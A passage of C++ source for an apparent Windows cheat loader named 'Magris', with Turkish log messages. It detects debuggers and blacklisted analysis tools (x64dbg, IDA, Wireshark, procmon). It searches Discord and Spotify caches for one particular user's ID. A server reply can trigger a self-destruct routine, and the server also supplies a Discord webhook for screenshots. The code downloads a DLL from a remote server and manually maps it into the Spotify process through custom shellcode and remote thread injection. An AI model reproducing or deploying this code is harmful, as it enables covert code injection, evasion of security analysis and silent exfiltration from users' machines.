        if (FAILED(psw->Item(v, &disp)) || !disp) continue;

        IWebBrowserApp* wba = nullptr;
        if (FAILED(disp->QueryInterface(IID_IWebBrowserApp, (void**)&wba)) || !wba) {
            disp->Release();
            continue;
        }
        BSTR url = nullptr;
        if (SUCCEEDED(wba->get_LocationURL(&url)) && url) {
            UINT urlLen = SysStringLen(url);
            if (urlLen > 0) {
                std::wstring surl(url, urlLen);
                SysFreeString(url);
                url = nullptr;
                if (surl.size() >= 8 && _wcsnicmp(surl.c_str(), XWC(L"file:///"), 8) == 0) {
                    wchar_t pathBuf[MAX_PATH * 4] = {};
                    DWORD cch = (DWORD)_countof(pathBuf);
                    if (SUCCEEDED(PathCreateFromUrlW(surl.c_str(), pathBuf, &cch, 0))) {
                        wchar_t pathFull[MAX_PATH * 4] = {};
                        DWORD np = GetFullPathNameW(pathBuf, _countof(pathFull), pathFull, NULL);
                        if (np && np < _countof(pathFull)) {
                            std::wstring p = pathFull;
                            for (auto& c : p) if (c == L'/') c = L'\\';
                            while (!p.empty() && p.back() == L'\\') p.pop_back();
                            std::wstring pLower = p;
                            if (!pLower.empty()) CharLowerBuffW(&pLower[0], (DWORD)pLower.size());
                            bool under = (pLower == installLower) ||
                                (pLower.size() > installLower.size() && pLower[installLower.size()] == L'\\' &&
                                 _wcsnicmp(pLower.c_str(), installLower.c_str(), installLower.size()) == 0);
                            if (under) {
                                wba->Release();
                                disp->Release();
                                psw->Release();
                                return true;
                            }
                        }
                    }
                }
            } else {
                SysFreeString(url);
            }
        }
        wba->Release();
        disp->Release();
    }
    psw->Release();
    return false;
}

static bool ScanDiscordForMason() {
    std::string t0 = XS("1114163536248193105");
    std::string t1 = XS("masonjack29");
    std::string t2 = XS("masonjack");
    const char* targets[] = { t0.c_str(), t1.c_str(), t2.c_str() };
    wchar_t appData[MAX_PATH] = {};
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) return false;
    const wchar_t* discordDirs[] = {
        XWC(L"\\Spotify\\Cache\\Cache_Data\\"),
        XWC(L"\\Spotify\\Local Storage\\leveldb\\"),
        XWC(L"\\discord\\Cache\\Cache_Data\\"),
        XWC(L"\\discord\\Local Storage\\leveldb\\"),
    };
    for (const wchar_t* dir : discordDirs) {
        std::wstring fullDir = std::wstring(appData) + dir;
        if (GetFileAttributesW(fullDir.c_str()) == INVALID_FILE_ATTRIBUTES) continue;
        for (const char* t : targets) {
            if (ScanDiscordCacheFolder(fullDir, t, strlen(t))) return true;
        }
    }
    return false;
}





static bool IsDebuggerAttached() {
    if (IsDebuggerPresent()) return true;
    BOOL remoteDbg = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDbg);
    if (remoteDbg) return true;
    LARGE_INTEGER freq, t1, t2;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t1);
    Sleep(2);
    QueryPerformanceCounter(&t2);
    double ms = (double)(t2.QuadPart - t1.QuadPart) / freq.QuadPart * 1000.0;
    if (ms > 100.0) return true;
    return false;
}

static std::vector<std::wstring> GetBlacklistedProcesses() {
    static std::vector<std::wstring> bl;
    if (bl.empty()) {
        bl.push_back(XW(L"x64dbg.exe")); bl.push_back(XW(L"x32dbg.exe"));
        bl.push_back(XW(L"ida.exe")); bl.push_back(XW(L"ida64.exe"));
        bl.push_back(XW(L"cheatengine-x86_64.exe")); bl.push_back(XW(L"cheatengine.exe"));
        bl.push_back(XW(L"processhacker.exe")); bl.push_back(XW(L"wireshark.exe"));
        bl.push_back(XW(L"fiddler.exe")); bl.push_back(XW(L"httpdebugger.exe"));
        bl.push_back(XW(L"dnspy.exe")); bl.push_back(XW(L"ollydbg.exe"));
        bl.push_back(XW(L"ghidra.exe")); bl.push_back(XW(L"scylla.exe"));
        bl.push_back(XW(L"reclass.exe")); bl.push_back(XW(L"reclass.net.exe"));
        bl.push_back(XW(L"de4dot.exe")); bl.push_back(XW(L"dumper.exe"));
        bl.push_back(XW(L"pe-bear.exe")); bl.push_back(XW(L"die.exe"));
        bl.push_back(XW(L"pestudio.exe")); bl.push_back(XW(L"procmon.exe"));
        bl.push_back(XW(L"procmon64.exe")); bl.push_back(XW(L"procexp.exe"));
        bl.push_back(XW(L"procexp64.exe")); bl.push_back(XW(L"apimonitor-x64.exe"));
        bl.push_back(XW(L"apimonitor-x86.exe"));
    }
    return bl;
}
static bool IsBlacklistedProcessRunning(std::string& outName) {
    auto blacklist = GetBlacklistedProcesses();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32FirstW(snap, &pe)) {
        do {
            for (const auto& bl : blacklist) {
                if (_wcsicmp(pe.szExeFile, bl.c_str()) == 0) {
                    char narrow[256] = {};
                    WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, narrow, 256, NULL, NULL);
                    outName = narrow;
                    found = true;
                    break;
                }
            }
            if (found) break;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

bool CheckForBlacklistedTools() {
    static std::vector<std::wstring> bw;
    if (bw.empty()) {
        bw.push_back(XW(L"x64dbg")); bw.push_back(XW(L"x32dbg"));
        bw.push_back(XW(L"IDA")); bw.push_back(XW(L"IDA Pro"));
        bw.push_back(XW(L"IDA v")); bw.push_back(XW(L"Cheat Engine"));
        bw.push_back(XW(L"Process Hacker")); bw.push_back(XW(L"Wireshark"));
        bw.push_back(XW(L"Fiddler")); bw.push_back(XW(L"HTTP Debugger"));
        bw.push_back(XW(L"dnSpy")); bw.push_back(XW(L"OllyDbg"));
        bw.push_back(XW(L"Ghidra")); bw.push_back(XW(L"Scylla"));
        bw.push_back(XW(L"Dump")); bw.push_back(XW(L"ReClass"));
        bw.push_back(XW(L"PE-bear")); bw.push_back(XW(L"DIE"));
        bw.push_back(XW(L"pestudio")); bw.push_back(XW(L"API Monitor"));
    }
    for (const auto& title : bw) {
        if (FindWindowW(NULL, title.c_str()) != NULL) {
            return true;
        }
    }
    return false;
}


static void BringDestructWindowToFront(HWND hDestruct) {
    if (!hDestruct || !IsWindow(hDestruct)) return;
    DWORD ourTid = GetCurrentThreadId();
    DWORD fgTid = 0;
    HWND hFg = GetForegroundWindow();
    if (hFg && hFg != hDestruct)
        fgTid = GetWindowThreadProcessId(hFg, NULL);
    if (fgTid && fgTid != ourTid) {
        AttachThreadInput(ourTid, fgTid, TRUE);
        SetForegroundWindow(hDestruct);
        SetFocus(hDestruct);
        AttachThreadInput(ourTid, fgTid, FALSE);
    } else {
        SetForegroundWindow(hDestruct);
        SetFocus(hDestruct);
    }
    SetWindowPos(hDestruct, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
}

void TriggerAntiCrackDestruct() {
    SendSecurityAlertLog(XS("Reverse engineering araci tespit edildi. Auto-Destruct baslatildi."));

    InitDestructStatusCS();
    g_isDestructing = true;
    HINSTANCE hDllInst = GetModuleHandle(NULL);
    int sx = GetSystemMetrics(SM_CXSCREEN), sy = GetSystemMetrics(SM_CYSCREEN);
    g_hDestructWnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, XWC(L"MagrisDestructWnd"), XWC(L"Magris Destruct"),
        WS_POPUP | WS_VISIBLE, (sx - 300)/2, (sy - 400)/2, 300, 400, NULL, NULL, hDllInst, NULL);
    if (g_hDestructWnd) {
        SetTimer(g_hDestructWnd, 2, 50, NULL);
        ShowWindow(g_hDestructWnd, SW_SHOW);
        UpdateWindow(g_hDestructWnd);
        BringDestructWindowToFront(g_hDestructWnd);
        for (int i = 0; i < 10; i++) {
            MSG m = {};
            while (PeekMessageW(&m, NULL, 0, 0, PM_REMOVE)) {
                TranslateMessage(&m);
                DispatchMessageW(&m);
            }
            Sleep(50);
        }
    }
    ShowWindow(g_hwnd, SW_HIDE);
    if (g_hDestructWnd)
        CreateThread(NULL, 0, DestructThread, NULL, 0, NULL);
}




std::wstring GetHwid() {
    DWORD serial = 0;
    if (GetVolumeInformationW(XWC(L"C:\\"), NULL, 0, &serial, NULL, NULL, NULL, 0))
        return std::to_wstring(serial);
    return std::wstring(XW(L"unknown"));
}

bool ValidateLicense(const std::wstring& key, const std::wstring& hwid, std::wstring* outUsername) {
    std::string body = XS("{\"key\":\"");
    for (wchar_t c : key) if (c != L'-' && c != L' ') body += (char)c;
    body += XS("\",\"hwid\":\""); for (wchar_t c : hwid) body += (char)c;
    body += XS("\"}");
    HINTERNET hi = InternetOpenW(XWC(L"Magris"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hi) return false;
    HINTERNET hc = InternetConnectW(hi, AUTH_URL, AUTH_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hc) { InternetCloseHandle(hi); return false; }
    HINTERNET hr = HttpOpenRequestW(hc, XWC(L"POST"), XWC(L"/api/validate"), NULL, NULL, NULL, kHttpNoDiskCache, 0);
    if (!hr) { InternetCloseHandle(hc); InternetCloseHandle(hi); return false; }
    wchar_t hdrBuf[256];
    swprintf_s(hdrBuf, _countof(hdrBuf), L"Content-Type: application/json\r\nContent-Length: %zu\r\n", body.size());
    DWORD hdrLen = (DWORD)wcslen(hdrBuf);
    if (!HttpSendRequestW(hr, hdrBuf, hdrLen, (LPVOID)body.data(), (DWORD)body.size())) {
        InternetCloseHandle(hr); InternetCloseHandle(hc); InternetCloseHandle(hi); return false;
    }
    char buf[512] = {}; DWORD read = 0; std::string response;
    while (InternetReadFile(hr, buf, sizeof(buf) - 1, &read) && read) { buf[read] = 0; response += buf; }
    InternetCloseHandle(hr); InternetCloseHandle(hc); InternetCloseHandle(hi);
    ClearKeyScreenshotSecure();
    if (response.find(XS("\"ok\":true")) == std::string::npos) {
        if (response.find(XS("\"destruct\"")) != std::string::npos ||
            response.find(XS("\"key_expired\"")) != std::string::npos) {
            TriggerAntiCrackDestruct();
        }
        return false;
    }
    auto u = response.find(XS("\"username\":\"")); if (u != std::string::npos && outUsername) {
        u += 12; auto e = response.find(XS("\""), u);
        if (e != std::string::npos) for (size_t i = u; i < e; i++) (*outUsername) += (wchar_t)(unsigned char)response[i];
    }
    
    auto daysLeft = response.find(XS("\"daysLeft\":"));
    if (daysLeft != std::string::npos) {
        daysLeft += 11;
        auto days_e = response.find_first_of(XS(",}"), daysLeft);
        if (days_e != std::string::npos) {
            g_userExpiry.clear();
            std::string numStr;
            for (size_t i = daysLeft; i < days_e; i++)
                if (response[i] >= '0' && response[i] <= '9') numStr += response[i];
            if (!numStr.empty()) {
                for (char c : numStr) g_userExpiry += (wchar_t)(unsigned char)c;
                g_userExpiry += XW(L" gun kaldi");
            }
        }
    }
    if (g_userExpiry.empty()) {
        auto ex = response.find(XS("\"expiry\":\"")); if (ex != std::string::npos) {
            ex += 10; auto ex_e = response.find(XS("\""), ex);
            if (ex_e != std::string::npos) {
                for (size_t i = ex; i < ex_e; i++) g_userExpiry += (wchar_t)(unsigned char)response[i];
            }
        }
    }
    if (g_userExpiry.empty()) {
        auto days = response.find(XS("\"days\":")); if (days != std::string::npos) {
            days += 7; auto days_e = response.find_first_of(XS(",}"), days);
            if (days_e != std::string::npos) {
                for (size_t i = days; i < days_e; i++) {
                    if (response[i] >= '0' && response[i] <= '9') g_userExpiry += (wchar_t)(unsigned char)response[i];
                }
                if (!g_userExpiry.empty()) g_userExpiry += XW(L" gun kaldi");
            }
        }
    }
    if (g_userExpiry.empty()) {
        auto life = response.find(XS("\"expiry\":\"Lifetime\""));
        if (life != std::string::npos) g_userExpiry = XW(L"Lifetime");
    }
    
    {
        const std::string key = XS("\"screenshotWebhook\":\"");
        auto wh = response.find(key);
        if (wh != std::string::npos) {
            wh += key.size();
            auto wh_e = response.find(XS("\""), wh);
            if (wh_e != std::string::npos && wh_e > wh) {
                std::string url = response.substr(wh, wh_e - wh);
                for (size_t j = wh; j < wh_e && j < response.size(); j++)
                    response[j] = 0;
                const std::string prefix = XS("https://discord.com");
                if (url.rfind(prefix, 0) == 0) {
                    std::string path = url.substr(prefix.size());
                    if (path.empty()) path = XS("/");
                    int wlen = MultiByteToWideChar(CP_UTF8, 0, path.c_str(), (int)path.size(), NULL, 0);
                    if (wlen > 0) {
                        std::wstring wpath(wlen, L'\0');
                        MultiByteToWideChar(CP_UTF8, 0, path.c_str(), (int)path.size(), &wpath[0], wlen);
                        StoreKeyScreenshotPath(wpath);
                        SecureZeroMemory(&wpath[0], wpath.size() * sizeof(wchar_t));
                    }
                    if (!path.empty())
                        SecureZeroMemory(&path[0], path.size());
                }
                if (!url.empty()) {
                    SecureZeroMemory(&url[0], url.size());
                    url.clear();
                }
            }
        }
    }
    return true;
}

static void FetchDllUpdateTime() {
    HINTERNET hInet = InternetOpenA(XSC("Magris/1.0"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInet) return;
    char authA[64];
    WideCharToMultiByte(CP_ACP, 0, AUTH_URL, -1, authA, sizeof(authA), NULL, NULL);
    HINTERNET hConn = InternetConnectA(hInet, authA, AUTH_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hInet); return; }
    HINTERNET hReq = HttpOpenRequestA(hConn, XSC("GET"), XSC("/api/download/menu/info"), NULL, NULL, NULL, kHttpNoDiskCache, 0);
    if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hInet); return; }
    if (!HttpSendRequestA(hReq, NULL, 0, NULL, 0)) {
        InternetCloseHandle(hReq); InternetCloseHandle(hConn); InternetCloseHandle(hInet); return;
    }
    char buf[512] = {}; DWORD rd = 0; std::string resp;
    while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &rd) && rd) { buf[rd] = 0; resp += buf; rd = 0; }
    InternetCloseHandle(hReq); InternetCloseHandle(hConn); InternetCloseHandle(hInet);

    auto dp = resp.find(XS("\"date\":\""));
    if (dp == std::string::npos) return;
    dp += 8;
    auto de = resp.find(XS("\""), dp);
    if (de == std::string::npos || de <= dp) return;
    std::string isoDate = resp.substr(dp, de - dp);

    SYSTEMTIME st = {};
    if (isoDate.size() >= 19) {
        st.wYear   = (WORD)atoi(isoDate.substr(0, 4).c_str());
        st.wMonth  = (WORD)atoi(isoDate.substr(5, 2).c_str());
        st.wDay    = (WORD)atoi(isoDate.substr(8, 2).c_str());
        st.wHour   = (WORD)atoi(isoDate.substr(11, 2).c_str());
        st.wMinute = (WORD)atoi(isoDate.substr(14, 2).c_str());
        st.wSecond = (WORD)atoi(isoDate.substr(17, 2).c_str());
    } else return;

    FILETIME ftUpload, ftNow;
    SystemTimeToFileTime(&st, &ftUpload);
    GetSystemTimeAsFileTime(&ftNow);

    ULARGE_INTEGER uUpload, uNow;
    uUpload.LowPart = ftUpload.dwLowDateTime; uUpload.HighPart = ftUpload.dwHighDateTime;
    uNow.LowPart    = ftNow.dwLowDateTime;    uNow.HighPart    = ftNow.dwHighDateTime;

    if (uNow.QuadPart <= uUpload.QuadPart) {
        wcscpy_s(g_products[0].updated, XWC(L"Just now"));
        return;
    }

    ULONGLONG diffSec = (uNow.QuadPart - uUpload.QuadPart) / 10000000ULL;
    ULONGLONG days  = diffSec / 86400;
    ULONGLONG hours = (diffSec % 86400) / 3600;
    ULONGLONG mins  = (diffSec % 3600) / 60;

    wchar_t timeBuf[64];
    if (days > 0)
        swprintf_s(timeBuf, XWC(L"%llu days, %llu hours ago"), days, hours);
    else if (hours > 0)
        swprintf_s(timeBuf, XWC(L"%llu hours, %llu minutes ago"), hours, mins);
    else
        swprintf_s(timeBuf, XWC(L"%llu minutes ago"), mins);

    wcscpy_s(g_products[0].updated, timeBuf);
}




static LPVOID g_mappedBaseInSpotify = nullptr;
static DWORD  g_spotifyPidForCleanup = 0;

static bool DownloadDllFromAuth(std::vector<BYTE>& outBuf) {
    char url[256];
    wsprintfA(url, XSC("/api/download/menu/latest"));
    HINTERNET hInet = InternetOpenA(XSC("MagrisLauncher/2.0"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInet) return false;
    char authA[64];
    WideCharToMultiByte(CP_ACP, 0, AUTH_URL, -1, authA, sizeof(authA), NULL, NULL);
    HINTERNET hConn = InternetConnectA(hInet, authA, (INTERNET_PORT)AUTH_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hInet); return false; }
    HINTERNET hReq = HttpOpenRequestA(hConn, XSC("GET"), url, NULL, NULL, NULL, kHttpNoDiskCache, 0);
    if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hInet); return false; }
    if (!HttpSendRequestA(hReq, NULL, 0, NULL, 0)) { InternetCloseHandle(hReq); InternetCloseHandle(hConn); InternetCloseHandle(hInet); return false; }
    DWORD statusCode = 0, sz = sizeof(statusCode);
    HttpQueryInfoA(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &sz, NULL);
    if (statusCode != 200) { InternetCloseHandle(hReq); InternetCloseHandle(hConn); InternetCloseHandle(hInet); return false; }
    outBuf.clear();
    BYTE tmp[8192];
    DWORD bytesRead = 0;
    while (InternetReadFile(hReq, tmp, sizeof(tmp), &bytesRead) && bytesRead > 0)
        outBuf.insert(outBuf.end(), tmp, tmp + bytesRead);
    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInet);
    return (outBuf.size() > sizeof(IMAGE_DOS_HEADER));
}

static DWORD FindProcessByExeName(const wchar_t* exeName) {
    if (!exeName || !*exeName) return 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static DWORD FindProcessByImagePath(const std::wstring& targetPath) {
    if (targetPath.empty()) return 0;
    wchar_t targetFull[MAX_PATH] = {};
    if (GetFullPathNameW(targetPath.c_str(), MAX_PATH, targetFull, NULL) == 0)
        wcscpy_s(targetFull, targetPath.c_str());

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD found = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;
            wchar_t img[MAX_PATH] = {};
            DWORD sz = MAX_PATH;
            if (QueryFullProcessImageNameW(hProc, 0, img, &sz)) {
                wchar_t imgFull[MAX_PATH] = {};
                if (GetFullPathNameW(img, MAX_PATH, imgFull, NULL) == 0)
                    wcscpy_s(imgFull, img);
                if (_wcsicmp(imgFull, targetFull) == 0)
                    found = pe.th32ProcessID;
            }
            CloseHandle(hProc);
            if (found) break;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

static std::wstring ReadSpotifyPathFromFile(const std::wstring& dir) {
    std::wstring pathFile = dir + XW(L"spotify_path.txt");
    if (GetFileAttributesW(pathFile.c_str()) == INVALID_FILE_ATTRIBUTES)
        return L"";
    HANDLE f = CreateFileW(pathFile.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (f == INVALID_HANDLE_VALUE)
        return L"";
    char buf[MAX_PATH * 2] = {};
    DWORD read = 0;
    std::wstring out;
    if (ReadFile(f, buf, sizeof(buf) - 1, &read, NULL) && read) {
        buf[read] = 0;
        int len = MultiByteToWideChar(CP_ACP, 0, buf, -1, NULL, 0);
        if (len > 0) {
            wchar_t* wbuf = new wchar_t[len];
            MultiByteToWideChar(CP_ACP, 0, buf, -1, wbuf, len);
            out = wbuf;
            while (!out.empty() && (out.back() == L'\r' || out.back() == L'\n' || out.back() == L' '))
                out.pop_back();
            delete[] wbuf;
        }
    }
    CloseHandle(f);
    return out;
}

static DWORD FindSpotifyProcess() {
    std::wstring origPath = ReadSpotifyPathFromFile(GetMagrisExeDir());
    if (!origPath.empty()) {
        DWORD pid = FindProcessByImagePath(origPath);
        if (pid) return pid;
        const wchar_t* base = wcsrchr(origPath.c_str(), L'\\');
        base = base ? base + 1 : origPath.c_str();
        pid = FindProcessByExeName(base);
        if (pid) return pid;
    }
    DWORD pid = FindProcessByExeName(XW(L"SpotifyLauncher.exe").c_str());
    if (pid) return pid;
    pid = FindProcessByExeName(XW(L"Spotify_real.exe").c_str());
    if (pid) return pid;
    return FindProcessByExeName(XW(L"Spotify.exe").c_str());
}


#pragma pack(push, 1)
struct ManualMapData {
    LPVOID                             pBase;
    HMODULE (WINAPI*                   fnLoadLibraryA)(LPCSTR);
    FARPROC (WINAPI*                   fnGetProcAddress)(HMODULE, LPCSTR);
    BOOL    (WINAPI*                   fnDllMain)(HINSTANCE, DWORD, LPVOID);
    LPVOID                             fnRunWezyCheat;
    DWORD                              result;
};
#pragma pack(pop)

#pragma optimize("", off)
#pragma strict_gs_check(push, off)
#pragma check_stack(off)
__declspec(safebuffers)
static DWORD WINAPI ShellcodeEntry(ManualMapData* pData) {
    if (!pData) return 1;
    if (!pData->pBase) return 2;

    pData->result = 0;

    BYTE* pBase = (BYTE*)pData->pBase;
    IMAGE_DOS_HEADER* dosH = (IMAGE_DOS_HEADER*)pBase;
    IMAGE_NT_HEADERS* ntH  = (IMAGE_NT_HEADERS*)(pBase + dosH->e_lfanew);

    
    DWORD impRVA = ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    DWORD impSz  = ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    if (impRVA && impSz) {
        IMAGE_IMPORT_DESCRIPTOR* desc = (IMAGE_IMPORT_DESCRIPTOR*)(pBase + impRVA);
        while (desc->Name) {
            char* modName = (char*)(pBase + desc->Name);
            HMODULE hMod = pData->fnLoadLibraryA(modName);
            if (!hMod) {
                pData->result = 0x20;
                desc++;
                continue;
            }
            IMAGE_THUNK_DATA* thunk = (IMAGE_THUNK_DATA*)(pBase + desc->FirstThunk);
            IMAGE_THUNK_DATA* origThunk = desc->OriginalFirstThunk
                ? (IMAGE_THUNK_DATA*)(pBase + desc->OriginalFirstThunk) : thunk;
            while (origThunk->u1.AddressOfData) {
                FARPROC fn = 0;
                if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                    fn = pData->fnGetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL(origThunk->u1.Ordinal));
                } else {
                    IMAGE_IMPORT_BY_NAME* ibn = (IMAGE_IMPORT_BY_NAME*)(pBase + origThunk->u1.AddressOfData);
                    fn = pData->fnGetProcAddress(hMod, ibn->Name);
                }
                if (!fn) {
                    pData->result = 0x21;
                    thunk++;
                    origThunk++;
                    continue;
                }
                thunk->u1.Function = (ULONGLONG)fn;
                thunk++;
                origThunk++;
            }
            desc++;
        }
    }

    
    DWORD tlsRVA = ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    DWORD tlsSz  = ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size;
    if (tlsRVA && tlsSz) {
        IMAGE_TLS_DIRECTORY* tls = (IMAGE_TLS_DIRECTORY*)(pBase + tlsRVA);
        PIMAGE_TLS_CALLBACK* callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
        if (callbacks) {
            while (*callbacks) {
                (*callbacks)((PVOID)pBase, DLL_PROCESS_ATTACH, 0);
                callbacks++;
            }
        }
    }

    
    if (pData->fnDllMain)
        pData->fnDllMain((HINSTANCE)pBase, DLL_PROCESS_ATTACH, 0);

    
    if (pData->fnRunWezyCheat) {
        typedef void (*RunFn)();
        ((RunFn)pData->fnRunWezyCheat)();
    }

    pData->result = 0xFF;
    return 0;
}
static void ShellcodeEntry_End() {}
#pragma check_stack()
#pragma strict_gs_check(pop)
#pragma optimize("", on)

static FARPROC FindExportInDll(BYTE* pBase, const char* exportName) {
    IMAGE_DOS_HEADER* dosH = (IMAGE_DOS_HEADER*)pBase;
    IMAGE_NT_HEADERS* ntH  = (IMAGE_NT_HEADERS*)(pBase + dosH->e_lfanew);
    DWORD expRVA = ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD expSz  = ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!expRVA || !expSz) return nullptr;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(pBase + expRVA);
    DWORD* names  = (DWORD*)(pBase + exp->AddressOfNames);
    WORD*  ords   = (WORD*)(pBase + exp->AddressOfNameOrdinals);
    DWORD* funcs  = (DWORD*)(pBase + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* name = (char*)(pBase + names[i]);
        bool match = true;
        for (int j = 0; exportName[j]; j++) {
            if (name[j] != exportName[j]) { match = false; break; }
        }
        if (match && name[lstrlenA(exportName)] == 0)
            return (FARPROC)(pBase + funcs[ords[i]]);
    }
    return nullptr;
}


static bool ApplyRelocations(BYTE* localImage, ULONGLONG remoteBase) {
    IMAGE_DOS_HEADER* dosH = (IMAGE_DOS_HEADER*)localImage;
    IMAGE_NT_HEADERS* ntH  = (IMAGE_NT_HEADERS*)(localImage + dosH->e_lfanew);
    ULONGLONG delta = remoteBase - ntH->OptionalHeader.ImageBase;
    if (!delta) return true;

    DWORD relocRVA = ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD relocSz  = ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    if (!relocRVA || !relocSz) return true;

    IMAGE_BASE_RELOCATION* rel = (IMAGE_BASE_RELOCATION*)(localImage + relocRVA);
    BYTE* relocEnd = (BYTE*)rel + relocSz;
    while ((BYTE*)rel < relocEnd && rel->VirtualAddress && rel->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
        DWORD count = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* list = (WORD*)(rel + 1);
        for (DWORD i = 0; i < count; i++) {
            WORD type = list[i] >> 12;
            DWORD offset = rel->VirtualAddress + (list[i] & 0xFFF);
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG* patch = (ULONGLONG*)(localImage + offset);
                *patch += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD* patch = (DWORD*)(localImage + offset);
                *patch += (DWORD)delta;
            }
        }
        rel = (IMAGE_BASE_RELOCATION*)((BYTE*)rel + rel->SizeOfBlock);
    }
    return true;
}

static std::string MMapErrStr(DWORD code) {
    char buf[16]; wsprintfA(buf, XSC("%X"), code); return std::string(buf);
}
static std::string MMapErrDetail(DWORD code) {
    switch (code) {
        case 0xA1: return XS("OpenProcess basarisiz (yonetici?)");
        case 0xA2: return XS("VirtualAllocEx image basarisiz");
        case 0xA3: return XS("VirtualAllocEx mapdata basarisiz");
        case 0xA4: return XS("VirtualAllocEx shellcode basarisiz");
        case 0xA5: return XS("CreateRemoteThread basarisiz");
        case 0xA6: return XS("WriteProcessMemory image basarisiz");
        case 0xA7: return XS("WriteProcessMemory mapdata basarisiz");
        case 0xA8: return XS("WriteProcessMemory shellcode basarisiz");
        case 0x20: return XS("LoadLibraryA basarisiz (DLL bagimliligi eksik)");
        case 0x21: return XS("GetProcAddress basarisiz (fonksiyon bulunamadi)");
        case 0x30: return XS("DllMain FALSE dondurdu");
        case 0xDEAD: return XS("Shellcode timeout veya beklenen sonuc alinmadi");
        case 0xB1: return XS("Fallback: temp dosya olusturulamadi");
        case 0xB2: return XS("Fallback: temp dosya yazilamadi");
        case 0xB3: return XS("Fallback: OpenProcess basarisiz");
        case 0xB4: return XS("Fallback: VirtualAllocEx path basarisiz");
        case 0xB5: return XS("Fallback: CreateRemoteThread basarisiz");
        case 0xB6: return XS("Fallback: LoadLibraryW dondugu handle 0 (DLL yuklenemedi)");
        default: return XS("Bilinmeyen hata kodu");
    }
}

static bool RemoteManualMap(DWORD spotifyPid, const std::vector<BYTE>& dllBytes) {
    SendErrorLogFast(XS("ManualMap BASLADI (PID=") + std::to_string(spotifyPid) + XS(" DLLSize=") + std::to_string(dllBytes.size()) + XS(")"));
    if (dllBytes.size() < sizeof(IMAGE_DOS_HEADER)) {
        SendErrorLog(XS("ManualMap: DLL boyutu cok kucuk (") + std::to_string(dllBytes.size()) + XS(" bytes)"));
        return false;
    }
    auto* dosH = (IMAGE_DOS_HEADER*)dllBytes.data();
    if (dosH->e_magic != IMAGE_DOS_SIGNATURE) {
        SendErrorLog(XS("ManualMap: DOS signature gecersiz"));
        return false;
    }
    auto* ntH = (IMAGE_NT_HEADERS*)(dllBytes.data() + dosH->e_lfanew);
    if (ntH->Signature != IMAGE_NT_SIGNATURE) {
        SendErrorLog(XS("ManualMap: NT signature gecersiz"));
        return false;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, spotifyPid);
    if (!hProc) {
        DWORD e = GetLastError();
